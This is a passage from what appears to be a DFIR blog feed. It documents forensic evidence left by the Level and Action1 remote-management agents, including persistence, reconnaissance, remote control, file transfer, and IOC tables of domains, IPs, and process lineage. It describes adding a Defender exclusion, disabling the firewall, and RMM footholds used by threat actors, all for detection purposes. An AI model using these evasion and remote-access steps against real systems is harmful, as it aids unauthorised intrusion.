but only this simple PowerShell script: The API_KEY value is not passed to the web server at this time, but is declared as a variable for a component in the ps1 script. The following stdout was displayed during the install. As expected the same script was recorded in the PowerShell console history. The installation process dropped a file in C:\Windows\Temp\ called "level-windows-amd64.exe." Looking at the contents of the ps1 file shows where this came from. The resultant Url concatenates to https://builds.level.io/stable/level-windows-amd64.exe. Although this binary was no longer on disk, I was able to pull a copy of it from this URL. The API key was then passed to the exe when it was executed. The program is not compatible with 32-bit operating systems, and therefore the installation path is found in "C:\Program Files\Level\ We see the installation process also make changes to the Windows firewall rules to allow any protocol inbound to the level agent. This generates a 2004 event in the Windows Firewall logs. Upon completion of installation, the web UI shows success and displays the following dashboard: Persistence The install establishes a service running as local system and establishes a scheduled task to run every 10 minutes to ensure the service is still running. (described here: https://docs.level.io/1.0/admin-guides/level-watchdog-task) Reconnaissance This is the first RMM tool I've seen using osquery to collect machine state information. A shrewd choice by the company, since all this code is proven and maintained elsewhere. I should note that their version of the osqueryi.exe was signed by LevelSoftware, but I assume it is largely intact from the open-source OSQuery project. The image below compares the sigcheck output from the Level version with the latest build from the OpenSource project: The OSquery commands are visible in basic process monitoring logs (e.g. Sysmon EventID ==1) In general, they include all the normals (running processes, hardware, software, services, etc). If a threat actor has gotten this far, all this data is leaking. Evidence of the user/group enumeration actions are also found in the security log under EventID == 4798. Network Observables During the installation the software resolved or contacted the following domains Application Logs All application logging I observed was limited to a file called level.log in the program files directory. The log file captures connection state and evidence of remote terminal and remote control. Very little else of value was found. There are two *.db files in the folder as well, but also contained little I could determine to be useful. Script/Command Execution I performed some testing of remote command execution in the web UI. Telemetry on the agent side revealed that the winpty-agent.exe is invoked which then spawns a child powershell process. The Level.log file contains an indication that a terminal was connected as well. I also created a custom script to add calc.exe to the exclusion list for Defender AV. After executing this on the endpoint, there was little trail to show what happened. Luckily, with PowerShell transcripts running, we have some visibility. A ps1 file is created in the Level program files directory (which was quickly disappeared), and our transcript shows the content of the ps1 script. If the location and filename are strong enough evidence, we can pivot on the Process ID or the ps1 filename to see if we can determine the provenance of this script. Remote Control A remote control session is easily established with the click of a button in the web UI. Once initiated, level.exe will spawn level-remote-control-ffmpeg.exe as a child process. Corroborating evidence can be found in the level.log file by searching for the string "Capturing whole desktop". Note, this string is also found in the level.exe memory strings. User Interaction The ability to run scripts, jobs, tasks against the client device without notifying the user is well established. However, the software will popup a notification to the user when the administrator starts a remote GUI sessions. Note, it doesn't not ask the user for permission. This information is detectable in obfuscated form in command line telemetry. If an investigator needed visibility into who was connecting in, they could reverse the above base64 string to get the cleartext. File Transfer Pushing a file to the client creates nothing useful in the level.log file. If sysmon is configured to record file creation events, you may observe the activity there. I pushed a file called meeting_saved_chat.txt into C:\Temp I also found the strings in memory for the level.exe process. Note, this capability also works with file. You can copy a file on your admin machine and send the clipboard data to the client where it can be pasted in to explorer on the client endpoint. No evidence of this was found in level.log. Pulling a file from the client left even less evidence. I pulled a file called Baseline.txt from the client device. I was unable to find anything in logs, but I was able to find one small breadcrumb in strings of a procdump of level.exe. I tried copying and pasting a file from client to admin machine, and it failed. However, the copy paste operation in that direction worked with ASCII text. No evidence of this was found in level.log. IOCs and TTPs https://downloads.level.io/install_windows.ps1 Evidence of downloading an installer downloads.level.io contacted by installer level-windows-amd64.exe logs.logdna.combuilds.level.iodownloads.level.ioonline.level.io Domain IOCs. Appeared first day of install, prior to taking any Remote Management actions. agents.level.iorealtime.ably.iorest.ably.io Only appeared in DNS records when I began testing Remote Management actions. winpty-agent.exe Execution is evidence of remote terminal session. Along with "Terminal/ Start" string in the level.log file. level-remote-control-ffmpeg.exe Execution is evidence of remote control session. osqueryi.exe Execution where signer is "Level Software" and parent process is level.exe level.exe Running as a service. Not signed. Foot Notes A matrix of RMM tools with links to reporting, research and detection rules is here: https://bit.ly/RMM_LOLBAS_Matrix]]></summary></entry><entry><title type="html">RMM – Action1: Client Side Evidence</title><link href="https://dfirtnt.github.io/2023/08/23/rmm-action1-client-side-evidence/" rel="alternate" type="text/html" title="RMM – Action1: Client Side Evidence" /><published>2023-08-23T15:04:29-04:00</published><updated>2023-08-23T15:04:29-04:00</updated><id>https://dfirtnt.github.io/2023/08/23/rmm-action1-client-side-evidence</id><content type="html" xml:base="https://dfirtnt.github.io/2023/08/23/rmm-action1-client-side-evidence/"><![CDATA[- Detection
- DFIR
- IRTriage
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd"><br />
<html><body></p>
<figure class="wp-block-table aligncenter">
<table>
<tbody>
<tr>
<td>Today we turn our attention to <a rel="noreferrer noopener" href="https://www.action1.com" target="_blank">Action1</a> in this series on Remote Management and Monitoring (RMM) Tools.  Action1 boasts patch management as a key capability they offer.<br><br>However, threat actors are also using Action1 to establish <a rel="noreferrer noopener" href="https://www.bleepingcomputer.com/news/security/hackers-start-abusing-action1-rmm-in-ransomware-attacks/" target="_blank">footholds </a>in victim organizations.  <a href="https://www.virustotal.com/gui/file/1574936467e9903fcdb84f2c06b82d0a7f5fbac387e68a2d74411d671371d054">Here </a>is an example of a recently reported malicious Action1 installer where the threat actor has bundled their malware with an apparently legit MSI installation file. Once again, let's examine Action1's telemetry and forensic footprint to aid incident responders.<br><br>Click <a href="#ioc-ttps">here </a>to skip straight to the IOCs and TTPs</td>
<td><img style="width: 800px" src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-23.png?w=461" alt=""></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<ol>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#Publicher">Publisher</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#Capabilities">Capabilities</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#testing-methodology">Testing Methodology</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#installation">Installation</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#persistence">Persistence</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#reconnaissance">Reconnaissance</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#application-logs">Application Logs</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#network">Network</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#file-system">File System</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#script-command-execution">Script/Command Execution</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#remote-control">Remote Control</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#user-interaction">User Interaction</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#data-exfil">Data Exfil</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/08/23/rmm-action1-client-side-evidence/#ioc-ttps">IOCs and TTPs</a></li>
</ol>
<p><!-- /wp:table-of-contents --></p>
<p></p>
<h2 class="wp-block-heading" id="Publicher"><strong>Publisher</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>The agent software is signed by "Action 1 Corporation." If you have a filename that matches what you expect from Action1, and it is not signed, it is likely malicious! <br><br><br>
</td>
<td><img style="width: 1400px" src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-57.png?w=1024" alt=""></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<h2 class="wp-block-heading" id="Capabilities"><strong>Capabilities</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>Action1 markets itself as a patch management tool, but it offers most of the basics of standard RMM tools:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<ul>
</p>
<li>Hardware, OS, software inventory</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Remote security patch management (including third party software)</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Pre-selected software distribution/installation</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Remote Control, Reboot, etc.</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Arbitrary code/script execution</li>
<p><!-- /wp:list-item -->
</ul>
<p><!-- /wp:list --></p>
<p></p>
<p>The free version allows up to 100 endpoint agents for free!</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image aligncenter size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-39.png?w=1024" alt="" class="wp-image-672" style="width:372px;height:51px" width="372" height="51"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading" id="testing-methodology"><strong>Testing Methodology</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>Testing was done with Xeox version 2.0.0.47 with the “victim” device being Windows10 v1709 (OS Build 16299.309). Telemetry used was:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<ul>
</p>
<li>Sysmon (with the Swift-on-Security config),</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>PowerShell script block logging and transcripts were enabled.</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Noriben was used to automate Procmon output.</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Manual process analysis performed with ProcessHacker.</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>EvtxCmd and Timeline Explorer for event log review.</li>
<p><!-- /wp:list-item -->
</ul>
<p><!-- /wp:list --></p>
<p></p>
<h2 class="wp-block-heading" id="installation"><strong>Installation</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>In the installation process, the account holder either provides a custom MSI installer or provides a URL an end user can use to pull down a copy of the custom installer. In my case, this was the custom URL:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<pre class="wp-block-code"><code>https://app.action1.com/agent/2c40f624-30b6-11ee-85ae-a55fe9f288ad/Windows/agent(My_Organization).msi</code></pre>
<p><!-- /wp:code --></p>
<p></p>
<p>During the installation a working directory was created containing the vast majority of the application files at C:\Windows\Action1\</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-25.png?w=1024" alt="" class="wp-image-647" style="width:573px;height:486px" width="573" height="486"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The "logs" folder contains a simple yet verbose log file that keeps track of most operations. We will see later that select jobs sent to the client tend to create a second/similar log in the same folder.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>During the installation, we can see that Powershell is heavily invoked. There is a pattern of *.ps1 files being sent, executed, and then deleted. We will see shortly that this is routine behavior and not just part of the installation.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-26-edited.png" alt="" class="wp-image-711" style="width:645px;height:311px" width="645" height="311"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>One interesting file called "what_is_this.txt" was observed being created by the install.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-27-edited.png" alt="" class="wp-image-712" style="width:508px;height:81px" width="508" height="81"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>Kudos to their team for the straight talk about how this could be used for good or evil.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<div aria-label="Offset Gallery" class="wp-block-coblocks-gallery-offset">
<ul class="coblocks-gallery has-no-alignment has-caption-style-dark has-small-images has-small-gutter">
<li class="coblocks-gallery--item">
<figure class="wp-block-coblocks-gallery-offset__figure"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-28.png?w=1024" alt="" data-id="652" class="wp-image-652"></figure>
</li>
</ul>
</div>
<p><!-- /wp:coblocks/gallery-offset --></p>
<p></p>
<h2 class="wp-block-heading" id="persistence"><strong>Persistence</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>The installer sets up up a service called "A1Agent" with system privileges pointing to a binary at C:\Windows\Action1\action1_agent.exe. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-31.png?w=1024" alt="" class="wp-image-657"></figure>
<p><!-- /wp:image --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-32.png?w=1024" alt="" class="wp-image-658"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading" id="reconnaissance"><strong>Reconnaissance</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>Without any action taken from the administrator side, the software begins collecting basic system information (e.g. OS, hardware, and software information) with PowerShell. While the associated ps1 files are deleted after use, the details of this activity are captured clearly within PowerShell transcript files.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Hardware</td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-35.png?w=1024" alt=""></td>
</tr>
<tr>
<td>OS and Software</td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-34.png?w=1024" alt="" style="width: 1200px"></td>
</tr>
<tr>
<td>Environment Variables</td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-36.png?w=1024" alt=""></td>
</tr>
<tr>
<td>Startup Programs</td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-37.png?w=1024" alt=""></td>
</tr>
<tr>
<td>Routing Tables</td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-38.png?w=1024" alt="" style="width: 800px"></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p>If you don't have PowerShell transcripts, similar information will also be found in PowerShell script block logging 4104 events.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-43.png?w=1024" alt="" class="wp-image-678"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading" id="application-logs"><strong>Application Logs</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>Action1 does a great job logging it's activities in it's application log files, which captures (among many other things) the same information shown above in the PowerShell transcript logs). The location of these log files is C:\Windows\Action1\logs\ with filenames containing the timestamps of when they were created. Most activity is stored in this one log file.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-30-edited-1.png" alt="" class="wp-image-713" style="width:182px;height:85px" width="182" height="85"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The agent also logs certain errors to the windows Application log with EventCode==1.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-64.png?w=1024" alt="" class="wp-image-725"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading" id="network"><strong>Network</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>The agent appears to contact the RMM server roughly every two minutes with a "heartbeat" connection. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-44.png?w=1024" alt="" class="wp-image-680" style="width:452px;height:180px" width="452" height="180"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>Action1_agent.exe appears in Sysmon EventCode==2 records for DNS requests to server.action1.com which returns an IP of  54.210.188.13   and  54.227.102.112 and an alias record status for "a1-server-prod-odd.action1.com"</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-50.png?w=1024" alt="" class="wp-image-692"></figure>
<p><!-- /wp:image --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-46.png?w=1024" alt="" class="wp-image-683"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading" id="file-system"><strong>File System</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>The filesystem/folders it creates at C:\Windows\Action1\ include a "Scripts" folder which serves as a temporary working space for script files. A review of file creation activity within this folder gives us an idea of the additional recon activities performed based on the names of the *.ps1 files.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-58.png?w=1024" alt="" class="wp-image-714" style="width:469px;height:226px" width="469" height="226"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading" id="script-command-execution"><strong>Script/Command Execution</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>I could not use the remote script/command execution options without a verified account. Since they don't accept noncorporate emails, I was stuck. I emailed them to ask for a workaround since I was doing research not affiliated with my employer. But they were unwilling to work with me.  </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-51.png?w=1024" alt="" class="wp-image-695"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p><strong>Arbitrary Execution</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>However, lucky for us, some malicious threat actor was able to use Action1 to deploy malware to a victim host. Credit to the @Kostastsale of the fantastic @TheDFIRRepot  for reporting the details we need for his part of the report. His full tweet thread is <a rel="noreferrer noopener" href="https://twitter.com/Kostastsale/status/1646256901506605063" target="_blank">here</a>.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>As illustrated below, we should see a folder created under "C:\Windows\Action1\package_downloads\" with a binary executable inside. Using standard "evidence of execution" investigative techniques will easily detect this activity.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-47.png?w=1024" alt="" class="wp-image-685" style="width:661px;height:136px" width="661" height="136"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The behavior observed when the admin launches PowerShell or CMD commands and scripts is captured below:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/ftiqrdeaiaenzny.jpg?w=1024" alt="" class="wp-image-699"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p><sup><em>Note: As I seem to have experienced, Action1 seems to have put in additional <a href="https://www.enigmasoftware.com/ransomware-operators-abusing-action1-rmm/">protections </a>following this abuse.</em> </sup></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><strong>Enumerate open TCP sessions</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>I ran one of the <strong>built-in scripts</strong> to <strong>enumerate open TCP sessions</strong> to external IP addresses. During this process I observed the following process lineage: action1_agent.exe -&gt; powershell.exe -&gt; nslookup.exe.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-52.png?w=1024" alt="" class="wp-image-697" style="width:542px;height:88px" width="542" height="88"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p><strong>Disable the windows firewall</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>I ran a pre-built job to <strong>disable the windows firewall</strong> which ran successfully. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><img width="314" height="64" src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-59.png?w=1024" alt=""></td>
<td><img width="309" height="92" src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-60.png?w=1024" alt=""></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p>This created a new *.log file in the logs directory. Several files and folders were also created to support his action as illustrated in the Noriben/procmon output below.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-61.png?w=1024" alt="" class="wp-image-719" style="width:572px;height:126px" width="572" height="126"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The log filename contains a timestamp indicating when the logging started. This correlates nicely with the MFT timestamps as well as the first line in the log file itself.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-62.png?w=1024" alt="" class="wp-image-721" style="width:626px;height:154px" width="626" height="154"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p><strong>Deploy from "App Store"</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>I also tested <strong>deploying </strong>a <strong>software </strong>install package (Splashtop Streamer) from their "app store." This also created a new log file in the logs directory.  </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-63.png?w=1024" alt="" class="wp-image-723"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading" id="remote-control"><strong>Remote Control</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>After the user allows the Action1 admin to remote into the client machine, the action1_agent.exe process spawned three instances of action1_remote.exe, as seen below:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-49.png?w=736" alt="" class="wp-image-689" style="width:293px;height:94px" width="293" height="94"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The timestamp of the execution of action1_remote.exe can serve investigators well to determine when this happened. But it is also recorded in the main log file.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-53.png?w=1019" alt="" class="wp-image-701" style="width:517px;height:142px" width="517" height="142"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>From these events we can see that the software is using WMI to collect screen and monitoring information. This is corroborated by correlating events in the WMI logs (Microsoft-Windows-WMI-Activity/Operational.evtx). </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>
<img width="770" height="177" src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-54.png?w=1008" alt=""><br><br><br><br>
</td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-55.png?w=1011" alt=""></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p>We also will see this command line in process execution events: </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<pre class="wp-block-code"><code><em>CommandLine: "C:\WINDOWS\Action1\action1_agent.exe" monitorcount</em></code></pre>
<p><!-- /wp:code --></p>
<p></p>
<p>Closing the session is not possible from the user side (aside from taskkill operations). It appears the only way to end the session is to simply close the browser window, returning you back to the previous tab with the admin console.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>The session appears to be using some amount of VNC code perform this remote control capability. This is evident in the log file during the time the session is closed.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-56.png?w=1024" alt="" class="wp-image-706"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading" id="user-interaction"><strong>User Interaction</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>Upon initiating a remote view/control session, the user on the client device would see a popup message like this one:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-48.png?w=1024" alt="" class="wp-image-687" style="width:351px;height:185px" width="351" height="185"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading" id="data-exfil"><strong>Data Exfil</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>Apart from arbitrary script execution, I didn't see a web GUI capability to pull files off the client device. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<h2 class="wp-block-heading" id="ioc-ttps"><strong>IOCs and TTPs</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<figure class="wp-block-table is-style-stripes">
<table>
<tbody>
<tr>
<td><strong>TTP/IOC</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr>
<td>https://app.action1.com/agent/*/Windows/agent(*).msi</td>
<td>URL to a downloadable MSI installer</td>
</tr>
<tr>
<td>Sysmon eventCode=1   c:\windows\action1\action1_agent.exe</td>
<td>Evidence of execution. The PE is designed to run as a service, so <em>source=system.evtx EventCode=7045</em> could also be used.</td>
</tr>
<tr>
<td>action1_agent.exe -&gt; powershell.exe -&gt; nslookup.exe</td>
<td>nslookup as the grandchild process of action1_agent.exe suggests admin directed recon of open network sessions with external IPs.</td>
</tr>
<tr>
<td>Sysmon eventCode=1<br>action1_remote.exe</td>
<td>Evidence of action1 being used for remote control.</td>
</tr>
<tr>
<td>server.action1.com<br>a1-server-prod-odd.action1.com<br>us-cdn.action1.com</td>
<td>Domain IOCs</td>
</tr>
<tr>
<td>54.210.188.13  <br>54.227.102.112</td>
<td>IP IOCs</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p><!-- /wp:paragraph --><br />
</body></html></p>]]></content><author><name>Andrew Skatoff</name></author><category term="Forensics" /><category term="Log Analysis" /><category term="RMM" /><summary type="html"><![CDATA[- Detection - DFIR - IRTriage Today we turn our attention to Action1 in this series on Remote Management and Monitoring (RMM) Tools. Action1 boasts patch management as a key capability they offer.However, threat actors are also using Action1 to establish footholds in victim organizations. Here is an example of a recently reported malicious Action1 installer where the threat actor has bundled their malware with an apparently legit MSI installation file. Once again, let's examine Action1's telemetry and forensic footprint to aid incident responders.Click here to skip straight to the IOCs and TTPs Publisher Capabilities Testing Methodology Installation Persistence Reconnaissance Application Logs Network File System Script/Command Execution Remote Control User Interaction Data Exfil IOCs and TTPs Publisher The agent software is signed by "Action 1 Corporation." If you have a filename that matches what you expect from Action1, and it is not signed, it is likely malicious! Capabilities Action1 markets itself as a patch management tool, but it offers most of the basics of standard RMM tools: Hardware, OS, software inventory Remote security patch management (including third party software) Pre-selected software distribution/installation Remote Control, Reboot, etc. Arbitrary code/script execution The free version allows up to 100 endpoint agents for free! Testing Methodology Testing was done with Xeox version 2.0.0.47 with the “victim” device being Windows10 v1709 (OS Build 16299.309). Telemetry used was: Sysmon (with the Swift-on-Security config), PowerShell script block logging and transcripts were enabled. Noriben was used to automate Procmon output. Manual process analysis performed with ProcessHacker. EvtxCmd and Timeline Explorer for event log review. Installation In the installation process, the account holder either provides a custom MSI installer or provides a URL an end user can use to pull down a copy of the custom installer. In my case, this was the custom URL: https://app.action1.com/agent/2c40f624-30b6-11ee-85ae-a55fe9f288ad/Windows/agent(My_Organization).msi During the installation a working directory was created containing the vast majority of the application files at C:\Windows\Action1\ The "logs" folder contains a simple yet verbose log file that keeps track of most operations. We will see later that select jobs sent to the client tend to create a second/similar log in the same folder. During the installation, we can see that Powershell is heavily invoked. There is a pattern of *.ps1 files being sent, executed, and then deleted. We will see shortly that this is routine behavior and not just part of the installation. One interesting file called "what_is_this.txt" was observed being created by the install. Kudos to their team for the straight talk about how this could be used for good or evil. Persistence The installer sets up up a service called "A1Agent" with system privileges pointing to a binary at C:\Windows\Action1\action1_agent.exe. Reconnaissance Without any action taken from the administrator side, the software begins collecting basic system information (e.g. OS, hardware, and software information) with PowerShell. While the associated ps1 files are deleted after use, the details of this activity are captured clearly within PowerShell transcript files. Hardware OS and Software Environment Variables Startup Programs Routing Tables If you don't have PowerShell transcripts, similar information will also be found in PowerShell script block logging 4104 events. Application Logs Action1 does a great job logging it's activities in it's application log files, which captures (among many other things) the same information shown above in the PowerShell transcript logs). The location of these log files is C:\Windows\Action1\logs\ with filenames containing the timestamps of when they were created. Most activity is stored in this one log file. The agent also logs certain errors to the windows Application log with EventCode==1. Network The agent appears to contact the RMM server roughly every two minutes with a "heartbeat" connection. Action1_agent.exe appears in Sysmon EventCode==2 records for DNS requests to server.action1.com which returns an IP of 54.210.188.13 and 54.227.102.112 and an alias record status for "a1-server-prod-odd.action1.com" File System The filesystem/folders it creates at C:\Windows\Action1\ include a "Scripts" folder which serves as a temporary working space for script files. A review of file creation activity within this folder gives us an idea of the additional recon activities performed based on the names of the *.ps1 files. Script/Command Execution I could not use the remote script/command execution options without a verified account. Since they don't accept noncorporate emails, I was stuck. I emailed them to ask for a workaround since I was doing research not 